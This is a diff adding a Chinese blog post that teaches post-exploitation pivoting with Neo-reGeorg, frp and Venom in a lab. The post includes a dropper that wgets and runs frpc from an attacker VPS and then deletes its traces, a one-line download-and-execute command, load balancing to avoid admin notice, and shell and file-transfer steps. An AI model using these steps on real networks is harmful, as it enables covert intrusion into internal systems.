@@ -192,6 +192,307 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://zls1793.github.io/2024/02/27/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%B1%87%E6%80%BB/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="LtmThink">
+      <meta itemprop="description" content="LtmThink的个人博客">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="LtmThink">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2024/02/27/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%B1%87%E6%80%BB/" class="post-title-link" itemprop="url">内网穿透工具使用汇总</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2024-02-27 00:00:00 / 修改时间：21:26:03" itemprop="dateCreated datePublished" datetime="2024-02-27T00:00:00+08:00">2024-02-27</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/" itemprop="url" rel="index"><span itemprop="name">工具使用</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="方式1-Neo-reGeorg"><mark>方式1</mark>:<a href="D:%5Csecurity%5Csoftware%5CNeo-reGeorg-master">Neo-reGeorg</a></h3>
+<p>测试在虚拟中进行:</p>
+<ol>
+<li class="lvl-3">
+<p>攻击者电脑：windows11 192.168.2.1</p>
+</li>
+<li class="lvl-3">
+<p>被入侵的服务器：kail192.168.2.139 和 192.168.22.132</p>
+</li>
+<li class="lvl-3">
+<p>内网其他应用:winows7服务器 192.168.22.133</p>
+</li>
+</ol>
+<p><mark>最低前提条件</mark>:获得被入侵服务器的文件上传权限</p>
+<p>步骤:</p>
+<ol>
+<li class="lvl-3">
+<p>下载Neo-reGeorg,并根据服务器的不同上传相应后缀的tunnel文件到服务器网站根目录下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#Neo-reGeorg是reGeory的优化重构版</span><br><span class="line">#下载链接</span><br><span class="line">https://github.com/L-codes/Neo-reGeorg</span><br></pre></td></tr></table></figure>
+</li>
+<li class="lvl-3">
+<p>在攻击者电脑上运行reGeory的python文件与服务器上上传的tunnel文件建立连接。访问本地</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#指令如下</span><br><span class="line">#生成相应的tunnel文件</span><br><span class="line">python neoreg.py generate -k password</span><br><span class="line"></span><br><span class="line">#连接tunnel文件</span><br><span class="line">python neoreg.py -k password -u http://192.168.2.139/tunnel.php</span><br></pre></td></tr></table></figure>
+<p>生成shell</p>
+<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202402272114530.png" alt="image-20240113214616603"></p>
+<p>建立连接</p>
+<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202402272114531.png" alt="image-20240113214728117"></p>
+<p>然后我们只需要以socks5协议设置代理为127.0.0.1:1080,即可通过192.168.2.139访问到内网主机192.168.22.133</p>
+<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202402272114532.png" alt="image-20240113215048186"></p>
+</li>
+</ol>
+<p>设置代理的方式:Proxifier、proxychains、浏览器或者软件自带的代理</p>
+<h3 id="方式2-frp"><mark>方式2</mark>:<a href="D:%5Csecurity%5Csoftware%5Cfrp">frp</a></h3>
+<p>测试在虚拟中进行:</p>
+<ol>
+<li class="lvl-3">
+<p>攻击者电脑：windows11</p>
+</li>
+<li class="lvl-3">
+<p>攻击者VPS：ubuntu 12.34.56.789</p>
+</li>
+<li class="lvl-3">
+<p>被入侵的服务器：kail 192.168.2.139 和 192.168.22.132</p>
+</li>
+<li class="lvl-3">
+<p>内网其他应用:winows7服务器 192.168.22.133(仅主机)</p>
+</li>
+</ol>
+<p><mark>最低前提条件</mark>:任意用户的shell</p>
+<p>frp服务端架设(基本配置):配置frps.toml</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#frp发布版下载链接如下</span><br><span class="line">https://github.com/fatedier/frp/releases/tag/v0.53.2</span><br><span class="line"></span><br><span class="line">#根据vps的不同选择下载相应版本的frp并上传到服务器</span><br><span class="line">#解压后编辑frps.toml对服务端进行配置</span><br><span class="line">#内容如下:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[common]</span><br><span class="line">bind_addr = 0.0.0.0</span><br><span class="line">bind_port = 7000</span><br><span class="line"></span><br><span class="line"># IP 与 bind_addr 默认相同，可以不设置</span><br><span class="line"># dashboard_addr = 0.0.0.0</span><br><span class="line"># 端口必须设置，只有设置web页面才生效</span><br><span class="line">dashboard_port = 7500</span><br><span class="line"># 用户密码保平安</span><br><span class="line">dashboard_user = LtmThink</span><br><span class="line">dashboard_pwd = 123456789</span><br><span class="line"></span><br><span class="line"># 允许客户端绑定的端口</span><br><span class="line">allow_ports = 1080</span><br></pre></td></tr></table></figure>
+<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202402272114533.png" alt="image-20240114140325177"></p>
+<p>运行frp服务端:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">chmod +x frps</span><br><span class="line">./frps -c ./frps.toml</span><br><span class="line"></span><br><span class="line">#后台运行frps的指令</span><br><span class="line">nohup ./frps -c ./frps.toml &amp;</span><br></pre></td></tr></table></figure>
+<p>然后访问7500端口输入先前配置中的账号密码就可以看到frp服务端成功架设</p>
+<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202402272114534.png" alt="image-20240114140806810"></p>
+<h4 id="1-socks协议代理">1.socks协议代理</h4>
+<p>首先最简单常用的就是socks协议代理，这一功能在 frp 中是以插件的形式实现的</p>
+<p>步骤:</p>
+<ol>
+<li class="lvl-3">
+<p>客户端配置:准备frpc和frpc.toml,并在frpc.toml中添加如下配置</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line"># 远程VPS地址</span><br><span class="line">server_addr = 12.34.56.789</span><br><span class="line">server_port = 7000</span><br><span class="line">tls_enable = true</span><br><span class="line">pool_count = 5</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[plugin_socks]</span><br><span class="line">type = tcp</span><br><span class="line">remote_port = 1080</span><br><span class="line">plugin = socks5</span><br><span class="line">plugin_user = test</span><br><span class="line">plugin_passwd = bnbm</span><br><span class="line">use_encryption = true</span><br><span class="line">use_compression = true</span><br></pre></td></tr></table></figure>
+</li>
+<li class="lvl-3">
+<p>将这两个文件合并存放到网站根目录的frpc文件夹下</p>
+<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202402272114535.png" alt="image-20240114143950913"></p>
+</li>
+<li class="lvl-3">
+<p>编写一个自动部署frpc的简单脚本ZLS并将其放到网站根目录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">wget http://12.34.56.789/frpc/frpc</span><br><span class="line">wget http://12.34.56.789/frpc/frpc.toml</span><br><span class="line">chmod +x frpc</span><br><span class="line"># 启动</span><br><span class="line">nohup ./frpc -c frpc.toml &amp;</span><br><span class="line"># 删除痕迹</span><br><span class="line">rm -rf /tmp/frpc</span><br><span class="line">rm -rf /tmp/frpc.toml</span><br></pre></td></tr></table></figure>
+</li>
+<li class="lvl-3">
+<p>将ZLS上传到服务器(任意方式),并运行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://12.34.56.789/ZLS &gt;/dev/null 2&gt;&amp;1 &amp;&amp; chmod +x ZLS &amp;&amp; ./ZLS  &amp;&amp; rm -rf ZLS</span><br></pre></td></tr></table></figure>
+</li>
+<li class="lvl-3">
+<p>然后根据frpc的配置,我们将vps的相应端口指定为代理即可访问到被入侵服务器的内网</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这里是2080端口</span><br></pre></td></tr></table></figure>
+<p>成功上线</p>
+<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202402272114536.png" alt="image-20240114150955371"></p>
+</li>
+</ol>
+<p>​				按照配置设置代理<img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202402272114537.png" alt="image-20240114154855544"></p>
+<p>成功访问内网web服务器并执行指令</p>
+<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202402272114538.png" alt="image-20240114154926559"></p>
+<p><mark>注意:</mark></p>
+<p><mark>部署步骤归结起来就是将两个frpc文件上传然后想办法使其运行即可</mark></p>
+<h4 id="2-多级代理使用方法">2.多级代理使用方法</h4>
+<p>环境准备:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">个人服务器(Ubuntu):12.34.56.789</span><br><span class="line">出网目标机(本地虚拟机kail,只能访问不能被访问,真实环境下可以被访问):192.168.2.1</span><br><span class="line">内网目标机1(centos7):192.168.2.150和192.168.22.132</span><br><span class="line">内网目标机2(windows7,80端口搭载web服务):192.168.22.133</span><br></pre></td></tr></table></figure>
+<ol>
+<li class="lvl-3">
+<p>个人服务器上配置frps.toml并运行frps</p>
+<p>配置:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_addr = 0.0.0.0</span><br><span class="line">bind_port = 7000</span><br><span class="line"></span><br><span class="line"># IP 与 bind_addr 默认相同，可以不设置</span><br><span class="line"># dashboard_addr = 0.0.0.0</span><br><span class="line"># 端口必须设置，只有设置web页面才生效</span><br><span class="line">dashboard_port = 7500</span><br><span class="line"># 用户密码保平安</span><br><span class="line">dashboard_user = LtmThink</span><br><span class="line">dashboard_pwd = 123456789</span><br><span class="line"></span><br><span class="line"># 允许客户端绑定的端口</span><br><span class="line">allow_ports = 1080</span><br></pre></td></tr></table></figure>
+<p>执行:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frps -c frps.toml</span><br></pre></td></tr></table></figure>
+</li>
+<li class="lvl-3">
+<p>出网目标机上配置frps.toml并运行frps</p>
+<p>配置:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_addr = 0.0.0.0</span><br><span class="line">bind_port = 7000</span><br></pre></td></tr></table></figure>
+<p>执行:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frps -c frps.toml</span><br></pre></td></tr></table></figure>
+</li>
+<li class="lvl-3">
+<p>出网目标机上配置frpc.toml并运行frpc</p>
+<p>配置:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">tls_enable = true</span><br><span class="line">server_addr = 12.34.56.789    </span><br><span class="line">server_port = 7000</span><br><span class="line">[http_proxy]</span><br><span class="line">type = tcp</span><br><span class="line">#绑定的远程端口,也就是sock5代理应该连接的端口</span><br><span class="line">remote_port = 1080</span><br><span class="line">#plugin = socks5，不能加上这个</span><br><span class="line">#相较于一级代理，增加如下两个配置</span><br><span class="line">local_ip = 0.0.0.0</span><br><span class="line">local_port = 7777</span><br></pre></td></tr></table></figure>
+<p>运行:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frpc -c frpc.toml</span><br></pre></td></tr></table></figure>
+</li>
+<li class="lvl-3">
+<p>内网目标机1上配置frpc.toml并运行frpc</p>
+<p>配置:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = 192.168.2.1</span><br><span class="line">server_port = 7000</span><br><span class="line">[http_proxy]</span><br><span class="line">type = tcp</span><br><span class="line">remote_port = 7777	  </span><br><span class="line">plugin = socks5</span><br></pre></td></tr></table></figure>
+<p>运行:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frpc -c frpc.toml</span><br></pre></td></tr></table></figure>
+</li>
+<li class="lvl-3">
+<p>将代理设置为个人服务器的1080端口即可访问内网</p>
+</li>
+</ol>
+<h4 id="3-负载均衡">3.负载均衡</h4>
+<p>使用场景:</p>
+<p>当我们获得好几台可以连接外网的主机时,就可以启用多台客户端，进行负载均衡。让其均衡分担我们访问内网的流量,</p>
+<p>毕竟突然从一台机器迸发出大量流量很容易引起管理员的注意，也可以负载分担一下机器的CPU资源消耗</p>
+<p>frpc配置:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line"># 远程VPS地址</span><br><span class="line">server_addr = 103.242.135.137</span><br><span class="line">server_port = 7000</span><br><span class="line">tls_enable = true</span><br><span class="line">pool_count = 5</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[plugin_socks]</span><br><span class="line"># [plugin_socks_2]</span><br><span class="line">type = tcp</span><br><span class="line">remote_port = 46075</span><br><span class="line">plugin = socks5</span><br><span class="line">plugin_user = test</span><br><span class="line">plugin_passwd = bnbm</span><br><span class="line">use_encryption = true</span><br><span class="line">use_compression = true</span><br><span class="line">group = socks_balancing</span><br><span class="line">group_key = NGbB5#8n</span><br></pre></td></tr></table></figure>
+<p>多台不同的被攻击机都这么配置就可以了关注多出来的group和group_key</p>
+<h4 id="4-udp协议代理">4.udp协议代理</h4>
+<p>frp也支持udp协议的代理</p>
+<p>以联机星露谷为例(服务端配置不变)</p>
+<p>客户端配置文件修改为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line"># 远程VPS地址</span><br><span class="line">server_addr = 12.34.56.789</span><br><span class="line">server_port = 7000</span><br><span class="line"></span><br><span class="line">[starudp]                   </span><br><span class="line">type = udp</span><br><span class="line">local_ip = 127.0.0.1</span><br><span class="line">local_port = 24642</span><br><span class="line">remote_port = 1080</span><br></pre></td></tr></table></figure>
+<p>这样访问服务器的1080端口就可以访问到本地的24642端口了(星露谷联机端口)</p>
+<h3 id="方式3-Venom-D-security-software-Venom-v1-1-0"><mark>方式3</mark>:[Venom](D:\security\software\Venom v1.1.0)</h3>
+<p>Venom v1.1.0内网穿透能力强于Neo-reGeorg,使用简单于frp,功能更加丰富,但稳定性差于frp</p>
+<p>注意:Venom即支持connect连接(<mark>节点主动连接</mark>)也支持listen连接(<mark>节点被连接</mark>)</p>
+<h4 id="1-单级代理使用方法">1.单级代理使用方法</h4>
+<p>环境准备:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">个人服务器(Ubuntu):12.34.56.789</span><br><span class="line">出网目标机(本地虚拟机kail,假设其是一个可以被访问到的公网ip,模拟真实情况):192.168.22.1</span><br><span class="line">内网目标机1(windows7,80端口搭载web服务):192.168.22.133</span><br></pre></td></tr></table></figure>
+<ol>
+<li class="lvl-3">
+<p>个人服务器上传admin_linux_x64并只需以下指令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">./admin_linux_x64 -lport 6666</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">或者</span><br><span class="line">#假设192.168.22.1是一个可以被访问到的公网ip</span><br><span class="line">个人服务器</span><br><span class="line">./admin_linux_x64 -rhost 192.168.22.1 -rport 6666</span><br><span class="line">那么目标机就应该</span><br><span class="line">./agent_linux_x64 -lport 6666</span><br></pre></td></tr></table></figure>
+</li>
+<li class="lvl-3">
+<p>出网目标机上传agent_linux_x64并执行以下指令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./agent_linux_x64 -rhost 12.34.56.789 -rport 6666</span><br></pre></td></tr></table></figure>
+</li>
+<li class="lvl-3">
+<p>回到个人服务器,在Venom命令行输入以下指令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#当完成第二部后个人服务器上的admin服务后提示连接成功</span><br><span class="line">#展示当前的节点</span><br><span class="line">show</span><br><span class="line">#进入出网目标机节点</span><br><span class="line">goto 1</span><br></pre></td></tr></table></figure>
+</li>
+<li class="lvl-3">
+<p>配置socks代理</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#在个人服务器的1080端口建立socks5代理,后续只要代理设置为12.34.56.789:1080即可访问内网目标机2</span><br><span class="line">socks 1080</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h4 id="2-多级代理使用方法-2">2.多级代理使用方法</h4>
+<p>环境准备:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">个人服务器(Ubuntu):12.34.56.789</span><br><span class="line">出网目标机(本地虚拟机kail,只能访问不能被访问,真实环境下可以被访问):192.168.2.1</span><br><span class="line">内网目标机1(centos7):192.168.2.150和192.168.22.132</span><br><span class="line">内网目标机2(windows7,80端口搭载web服务):192.168.22.133</span><br></pre></td></tr></table></figure>
+<ol>
+<li class="lvl-3">
+<p>个人服务器上传admin_linux_x64并只需以下指令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./admin_linux_x64 -lport 6666</span><br></pre></td></tr></table></figure>
+</li>
+<li class="lvl-3">
+<p>出网目标机上传agent_linux_x64并执行以下指令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#连接个人服务器的6666端口</span><br><span class="line">./agent_linux_x64 -rhost 12.34.56.789 -rport 6666</span><br></pre></td></tr></table></figure>
+</li>
+<li class="lvl-3">
+<p>内网目标机1上传agent_linux_x64并执行以下指令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#监听本地8080端口</span><br><span class="line">./agent_linux_x64 -lport 8080</span><br></pre></td></tr></table></figure>
+</li>
+<li class="lvl-3">
+<p>回到个人服务器,在Venom命令行输入以下指令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#进入出网目标机节点(在此节点可以访问的到不出网的内网目标机1)</span><br><span class="line">goto 1</span><br><span class="line">#连接内网目标机1的8080端口</span><br><span class="line">connect 192.168.2.150 8080</span><br><span class="line">#此时会显示连接成功</span><br><span class="line">#进入内网目标机1节点(在这个节点可以访问到内网目标机2了)</span><br><span class="line">goto 2</span><br></pre></td></tr></table></figure>
+</li>
+<li class="lvl-3">
+<p>配置socks代理</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#输入以下指令,会在个人服务器的1080开启代理服务,后续只要代理设置为12.34.56.789:1080即可访问内网目标机2</span><br><span class="line">socks 1080</span><br></pre></td></tr></table></figure>
+<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202402272114539.png" alt="image-20240206230831092"></p>
+</li>
+</ol>
+<h4 id="3-端口复用支持">3.端口复用支持</h4>
+<p>应用场合:某些情况下端口开放被禁用,我们可以使用已知的开放端口连接</p>
+<p>介绍:通过venom提供的端口复用功能，在windows上可以复用apache、mysql等服务的端口，暂时无法复用RDP、IIS等服务端口，在linux上可以复用多数服务端口。被复用的端口仍可正常对外提供其原有服务。</p>
+<p>环境准备:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin节点(本地虚拟机kail,可以访问192.168.22.133也可以被访问):192.168.2.1</span><br><span class="line">agent节点(windows7,80端口搭载web服务):192.168.22.133</span><br></pre></td></tr></table></figure>
+<p>agent节点执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#注意这里lhost的ip地址写本机地址，但不要写0.0.0.0</span><br><span class="line">agent.exe -lhost 192.168.22.133 -reuse-port 80</span><br></pre></td></tr></table></figure>
+<p>admin节点执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#admin连接192.168.22.133开放的80端口,而不会影响运行在其上的web服务</span><br><span class="line">./admin_linux_x64 -rhost 192.168.22.133 -rport 80</span><br></pre></td></tr></table></figure>
+<h4 id="4-端口转发">4.端口转发</h4>
+<p>在建立与内网之间的连接后我们还可以通过Venom将<mark>内网的端口转发到个人服务器的端口</mark>上,实现访问外部的个人服务器的某一端口即可访问到内网的某一端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#在个人服务器12.34.56.789的Venom命令行输入以下指令即可将内网192.168.22.133的80端口映射到#12.34.56.789:8070,后续只要访问12.34.56.789:8070即可访问到192.168.22.133：80</span><br><span class="line"></span><br><span class="line">rforward 192.168.22.133 80 8070</span><br></pre></td></tr></table></figure>
+<p>也支持将<mark>个人服务器的端口映射到内网的端口</mark></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#在Venom命令行进入节点192.168.22.133输入以下指令即可将本地的80端口，映射到192.168.22.133的8070端口,后续内网主机只要访问192.168.22.133:8070即可访问到访问到个人服务器12.34.56.789的80端口</span><br><span class="line"></span><br><span class="line">lforward  127.0.0.1 80 8090</span><br></pre></td></tr></table></figure>
+<h4 id="5-交互shell支持">5.交互shell支持</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">进入某一节点输入</span><br><span class="line">shell</span><br><span class="line">即可得到一个交互式shell</span><br></pre></td></tr></table></figure>
+<h4 id="6-文件上传下载支持">6.文件上传下载支持</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#进入某一节点输入类似指令</span><br><span class="line">goto 1</span><br><span class="line">upload  [file_path]  [upload_path]  #上传文件</span><br><span class="line">download [file_path]  [download_path]  #下载文件</span><br></pre></td></tr></table></figure>
+<p>参考博客:<a target="_blank" rel="noopener" href="https://www.cnblogs.com/xuanlvsec/p/14206776.html">https://www.cnblogs.com/xuanlvsec/p/14206776.html</a></p>
+<h3 id="代理设置工具-Proxifier-proxychains简单介绍"><mark>代理设置工具</mark>:Proxifier/proxychains简单介绍</h3>
+<h5 id="Proxifier">Proxifier</h5>
+<p>windows平台一般使用Proxifier来对特定软件进行代理</p>
+<p>打开软件后选择Profile的proxy servers进行代理服务器的添加</p>
+<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202402272114541.png" alt="image-20240114162712523"></p>
+<p>选择Proxification Rules进行相关规则的配置</p>
+<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202402272114542.png" alt="image-20240114162749125"></p>
+<p>规则里面</p>
+<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202402272114543.png" alt="image-20240114162852342"></p>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p>Default为默认的代理规则,这里是direct直连,表示默认所有软件不使用代理</p>
+</li>
+<li class="lvl-2">
+<p>然后针对特定软件的特定代理规则需要自己配置,向这里的nmap使用的是12.34.56.789这个代理</p>
+</li>
+</ul>
+<h5 id="proxychains">proxychains</h5>
+<p>linux平台一般使用proxychains来对特定软件进行代理。kail自带有proxychains,以kail里的proxychains为例介绍</p>
+<p>打开Proxychains配置文件/etc/proxychains4.conf，编辑文件中的代理服务器列表：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/proxychains4.conf</span><br></pre></td></tr></table></figure>
+<p>在文件的最后，添加代理服务器的IP地址和端口号，例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[ProxyList]</span><br><span class="line">socks5  127.0.0.1 1080</span><br></pre></td></tr></table></figure>
+<p>在终端中使用Proxychains启动需要代理的应用程序，例如Nmap扫描：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains nmap -sS 192.168.1.0/24	</span><br></pre></td></tr></table></figure>
